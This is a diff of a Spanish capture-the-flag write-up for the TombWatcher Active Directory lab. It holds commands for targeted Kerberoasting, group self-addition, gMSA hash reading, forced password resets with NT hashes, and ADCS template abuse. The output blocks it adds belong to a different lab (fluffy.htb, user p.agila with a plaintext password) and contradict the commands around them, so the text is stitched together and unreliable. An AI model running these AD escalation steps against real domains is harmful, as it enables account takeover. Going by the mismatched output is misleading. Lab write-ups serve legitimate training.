@@ -96,7 +96,21 @@ Reutilizaremos las credenciales filtradas por el creador para realizar una enume
 nxc smb $IP -u 'henry' -p 'H3nry_987TGV!' --users
 ```
 
-![NXC Users](/assets/img/tombwatcher_users.png)
+```
+SMB   10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB   10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
+SMB   10.129.17.155  445  DC01  -Username-          -Last PW Set-          -BadPW-  -Description-
+SMB   10.129.17.155  445  DC01  Administrator        2025-04-17 15:45:01 0           Built-in account for administering the computer/domain
+SMB   10.129.17.155  445  DC01  Guest                <never>             0           Built-in account for guest access to the computer/domain
+SMB   10.129.17.155  445  DC01  krbtgt               2025-04-17 16:00:02 0           Key Distribution Center Service Account
+SMB   10.129.17.155  445  DC01  ca_svc               2025-04-17 16:07:50 0
+SMB   10.129.17.155  445  DC01  ldap_svc             2025-04-17 16:17:00 0
+SMB   10.129.17.155  445  DC01  p.agila              2025-04-18 14:37:08 0
+SMB   10.129.17.155  445  DC01  winrm_svc            2025-05-18 00:51:16 0
+SMB   10.129.17.155  445  DC01  j.coffey             2025-04-19 12:09:55 0
+SMB   10.129.17.155  445  DC01  j.fleischman         2025-05-16 14:46:55 0
+SMB   10.129.17.155  445  DC01  [*] Enumerated 9 local users: FLUFFY
+```
 
 ### Enumeración de recursos compartidos
 
@@ -104,7 +118,19 @@ nxc smb $IP -u 'henry' -p 'H3nry_987TGV!' --users
 nxc smb $IP -u 'henry' -p 'H3nry_987TGV!' --shares
 ```
 
-![NXC Shares](/assets/img/tombwatcher_shares.png)
+```
+SMB   10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB   10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
+SMB   10.129.17.155  445  DC01  [*] Enumerated shares
+SMB   10.129.17.155  445  DC01  Share        Permissions   Remark
+SMB   10.129.17.155  445  DC01  -----        -----------   ------
+SMB   10.129.17.155  445  DC01  ADMIN$                     Remote Admin
+SMB   10.129.17.155  445  DC01  C$                         Default share
+SMB   10.129.17.155  445  DC01  IPC$         READ          Remote IPC
+SMB   10.129.17.155  445  DC01  IT           READ,WRITE
+SMB   10.129.17.155  445  DC01  NETLOGON     READ          Logon server share
+SMB   10.129.17.155  445  DC01  SYSVOL       READ          Logon server share
+```
 
 Los resultados muestran los recursos predeterminados de **Active Directory** (`ADMIN$`, `C$`,
 `IPC$`, `NETLOGON` y `SYSVOL`), sin recursos no estándar de interés inmediato.
@@ -125,7 +151,7 @@ bloodhound-ce-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -ns $IP -c
 BloodHound revela que `henry` tiene el permiso `WriteSPN` sobre `alfred`, lo que le permite
 modificar el atributo **servicePrincipalName** y realizar **Targeted Kerberoasting**.
 
-![WriteSPN](/assets/img/tombwatcher_writespn.png)
+![WriteSPN](/assets/img/tombwatcher/writespn.png)
 
 ```bash
 targetedKerberoast -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --dc-host dc01.tombwatcher.htb
@@ -161,7 +187,7 @@ nxc winrm $IP -u 'alfred' -p 'basketball'
 Sin acceso directo por **WinRM**. BloodHound muestra que `alfred` tiene el permiso `AddSelf`
 sobre el grupo **Infrastructure**:
 
-![AddSelf](/assets/img/tombwatcher_addself.png)
+![AddSelf](/assets/img/tombwatcher/addself.png)
 
 ```bash
 bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'alfred' -p 'basketball' add groupMember 'INFRASTRUCTURE' 'alfred'
@@ -178,7 +204,7 @@ bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'alfred' 
 Una vez en el grupo **Infrastructure**, BloodHound revela que este grupo tiene el permiso
 `ReadGMSAPassword` sobre la cuenta `ansible_dev$`.
 
-![ReadGMSA](/assets/img/tombwatcher_readgmsa.png)
+![ReadGMSA](/assets/img/tombwatcher/readgmsa.png)
 
 ```bash
 nxc ldap $IP -u 'alfred' -p 'basketball' --gmsa
@@ -196,7 +222,7 @@ PrincipalsAllowedToReadPassword: Infrastructure
 BloodHound revela que `ansible_dev$` tiene el permiso `ForceChangePassword` sobre el
 usuario `SAM`.
 
-![ForceChangePassword](/assets/img/tombwatcher_forcechange.png)
+![ForceChangePassword](/assets/img/tombwatcher/forcechange.png)
 
 ```bash
 bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'ansible_dev$' -p ':7e792e4c14e4040a0b4f18235a6afe55' set password 'SAM' 'Password!'
@@ -212,7 +238,7 @@ bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'ansible_
 
 BloodHound muestra que `SAM` tiene el permiso `WriteOwner` sobre el usuario `john`.
 
-![WriteOwner](/assets/img/tombwatcher_writeowner.png)
+![WriteOwner](/assets/img/tombwatcher/writeowner.png)
 
 ### 1. Hacerse owner de JOHN
 
@@ -278,7 +304,7 @@ Enrollment Rights: TOMBWATCHER.HTB\Domain Admins
                    S-1-5-21-1392491010-1358638721-2126982587-1111
 ```
 
-![BloodHound ADCS](/assets/img/tombwatcher_adcs.png)
+![BloodHound ADCS](/assets/img/tombwatcher/acds.png)
 
 > Un **SID** que no resuelve a ningún nombre indica que la cuenta fue **eliminada**, pero
 > el **ACE** en el template sigue activo en AD. Si restauramos esa cuenta, recuperamos
